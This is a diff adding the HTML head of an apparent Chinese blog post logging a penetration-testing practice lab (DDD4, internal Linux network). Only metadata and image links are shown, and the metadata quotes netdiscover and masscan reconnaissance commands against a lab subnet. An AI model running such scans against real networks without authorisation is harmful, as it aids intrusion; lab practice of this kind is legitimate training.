@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="打靶日记（二）linux内网完整渗透测试声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第二篇。 1. DDD4 靶场介绍本靶场存在三个 flag 把下载到的虚拟机环境导入到虚拟机，本靶场需要把网络环境配置好。  1.1.网络示意图  2.信息收集2.1主机发现1netdiscover -i eth0 -r 192.168.1.0&#x2F;24  2.2端口探测1masscan -p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶日记（二）linux内网完整渗透测试">
+<meta property="og:url" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="兀自">
+<meta property="og:description" content="打靶日记（二）linux内网完整渗透测试声明：此系列文章系个人记录打靶过程的文章，靶场为暗月师傅的靶场。这是第二篇。 1. DDD4 靶场介绍本靶场存在三个 flag 把下载到的虚拟机环境导入到虚拟机，本靶场需要把网络环境配置好。  1.1.网络示意图  2.信息收集2.1主机发现1netdiscover -i eth0 -r 192.168.1.0&#x2F;24  2.2端口探测1masscan -p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/aLiwvcp-UzbIWInlTkDoGYq9TK-5N3btQDHc_xgKO1w.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/boBeKNPQXMu535jEiekVmfNc7LZuqTiSTkNSQFXXZeA.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/5H-2EXhyD2qNM-eJXM53TTM8wYuaSAmHg-t_6eUnJs8.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/RFW8U9nOZltCzcATzIvXdG_-dVCQUTH7yoeCchV9t3Y.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/-gmtIITLfqy6oedfzCeYkCyHOSKkbRu_LFmIPK73Nio.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/-M4rBTSEL-uPNKbmLkhLMYijp8M6bc_TVJr11biX-tY.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/mD5soiazKv4Yvy31b_rIouCW4Sv4bNpULxrF9zVMCWY.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/i46MwEx32hMzuVSb9ehAkPdqiSITd4tWL1XcjT_i_Ho.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/N5eGpHcKw2O_hQ0XNM5MLw5zw1zfm97Wh5PJZgEZg90.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/lNcOugDegwk8TFfCv3f_Yjs2B-pmV9PIE0PNMO5wIE4.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ZPceR2i3tUi9g_PcS7Rmo95NbRUoVhbNdQ44Sbfwy0M.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vZzK91Arz0BeMnJ04XYhpne_qM_dfWjue6kVUCdM_9w.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/pKHTqWdUA3FzqVUgU_EZIPwIaKyk6O4hlqQbL3qvaZ4.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/cHL0rT91Xe3NnduVVq1FMoZAYw0ccWtRxAM16OWU_Fg.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/zWne8qc5UOMBbCgsoOpTYxud8SnCa2FZay1OhRUyR_o.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/unEb45ar18BfZxfrxuiLnjZ9TuWUgc3T2D1C7U4O5dE.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/wYCa0DExRxHN5CZl4z4l96rqJtoSHCaNxnnOY0Y-420.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/HeHSpFKheKKmk0B-bpZtwRaXoMY2JnGCJGSJTJ7e6zA.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/0eaTAy2xU59Xo3PGG-qnPJQw8FhbawWvP5-n8I0GOwg.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/lFgRqW__tTnM9orNPitddsi8owUqK_bBQz5rXctEPps.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/n4GA_vC-qtPSBi0tNQ7YIz4oKul6bSpVb9m4rkofi_g.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ZRnQs-_PfinT2HJg3iGZO9Ru6Mic-GN-UcZDxxltjr8.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OblQ59uqbfZF-Ghs5egVLKpWra-wX65xmo7jU_zgOfQ.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/XGYye6uVO5tRKailcVLRtiOVW4J_SzZoOhfjjbxwdRg.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ntRMyVWHpIB9LvvgQRM0BXo2HAb5skxEaMimR9erkFs.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/W84iUxb6yI0CvBfPsxEuQDameTh_DYFK8L5_ArnpM0k.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ak7CkSbwy_pGtg3xG384DwQ5ZxXz1m3lgYd_QkJcsb4.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/uQpRotn6YlxownHCky2IW5sVv5qBdvke5J65kG9f--M.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/193nUyMLq7yuECV-RrTOZf59ondr6g0KhutLyOr4cCw.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Vqwy9SF04HSPIfBIDyDWzTCjzUxUwZeTnK8WBNDi6Ys.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/aB6MVs7fb3yF62h5AENtIa-vZ75Hiaae6-_nIEy1z6Q.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/vtDjFBzclYelUnvE27U_Xs3s3hc01NspAbMY9Uj9cyY.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/jZ49Y4B5-M__QF2h0WfcWmAPSEopRPkU6q4cnVH4opI.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/E_HtppmFjm5ClxIHCHclJVNkamT6MdvqDJ1LkU_CRm4.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/my4Yl5Yv_WExJYO9NATlqjbtGJSWvwZaxyGBreLTBSo.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/rWhJf-22jquHpwiVzt8t2h9HNLzamN2-pdTPU11Mqbg.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/B-wQBGGuxmozgBamp_3DxqwaNB0XpC-s96S1ppsN-nM.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/LryINlCXHGFjOd_-Ng5CgUI57nKoIQau4xGDdfMk5eY.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Rk9jEKvjkHL9gy66Su_o1O8HwtM66_YevmUiPT9aYi4.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/GUNJi1Ah6o4H2XGwd3R4YEE81ZpXcUvpc0Oi1tLMvV0.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/ANyvx3w5tGYRvOUY4RuK1NoAe7j_pP7rJr4MEvcJ3RU.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/fGMM7Oh19ygjD4aQOWL8zd9u3MzKZQOqADCbM4jUfDU.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WewG-lcH9v8y3gmbx52f5ZaDDdlxS9ANnzd2U65oUcU.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/1Rnj75NOP05gZ4dmrsNV2B542Cyag1-zhilPsjyuviM.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JxPYS0jVwpzXYfLOIh9g94v0m5Q9OPcb7hBDA99B2JI.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/-RPTxJgyXwMBb4PUwBF-En3P8ykqs1c9rLLuJKHgmy0.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/AU2gQldA4OxBrzii6khdMjzwRokEpairfJcdiIoDGjw.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/dizUR8OjjOoSdxmLgwzZJihQ784RaXj_v_4NLgVme-Y.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/kNJhTAXsZ69uNVFcJE92Quk-37iXY_JwgEgaBQF283Y.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/mwM2koYg9Vl38le3S_Nl-SVcBYEg56jChEYNFp6KkrM.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/mGR-GyYQWjXUemmzMDdDn1yDULJ8REU_E2NeQqmZYZ4.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/KY5ot2xwFry1zm9drgKvP3gdXwMWVF7JDQ-UrEpDLsk.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/8H8zIyTCZzTeWCyFi6I3Pb_WVvjodkLj0ZMOOz9fcpw.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/OrnTY80CSPRY9sWj3_m6BUHORlRdwSwtUTYPIdN0rao.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/W2JDhK2kET5UvzycAo-RMf7ZIa8Wci0YZl12Gz9LvAM.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/p4fsTV-T-xpzjQ_bZ_yovuAg9wFToDyqwvU_RERHQ_g.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/7i2yD6iFayLLQFLXzLGQpQq7C4vWY12Ie9mFyMz1hIk.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/PcKOwqOF0AOraUUKv_g5mgriiSJvrtSSH0q5HUi0gKs.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/qQ2ydqInvynsfxU-i12XG7GS9AhrXV0J304plvCL2no.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/R9x92PTRDy2p-J-ws2302wLWv4048v47GsxGn6pRT-0.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/nln8xWQk8lshZ3k8T71ic4C-V6eEILztDJ4cUp2FMFs.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/PEJ7gJoadiufgS6l7KCbQj6oiIuX6qU0brKxyXhtN0M.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/KZvBLHYyKqRm7pii6bQ29Y93wWQjIPbpkPXRt9GaUzQ.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/VYze8T5MpfU6n-z0YJp79B6759o5sOZurVzYvVyy7NA.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2DOrDq8gNrsjL87Ahm6PD89vQm4DufrOw1ql2DjCtls.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/RCH3_E6R45eT4MJj0esLf6JN0VHdzlGPeszMcHJYrAI.png">
+<meta property="og:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/4rRuEMZ_HorDIkEdLJjknTY-X48iQYCzy7IgMyX3SM8.png">
+<meta property="article:published_time" content="2021-10-31T11:38:38.000Z">
+<meta property="article:modified_time" content="2023-05-29T14:32:38.742Z">
+<meta property="article:author" content="Garck3h">
+<meta property="article:tag" content="域渗透">
+<meta property="article:tag" content="红队">
+<meta property="article:tag" content="打点">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://garckz.github.io/2021/10/31/%E6%89%93%E9%9D%B6%E6%97%A5%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89linux%E5%86%85%E7%BD%91%E5%AE%8C%E6%95%B4%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/aLiwvcp-UzbIWInlTkDoGYq9TK-5N3btQDHc_xgKO1w.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>打靶日记（二）linux内网完整渗透测试</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
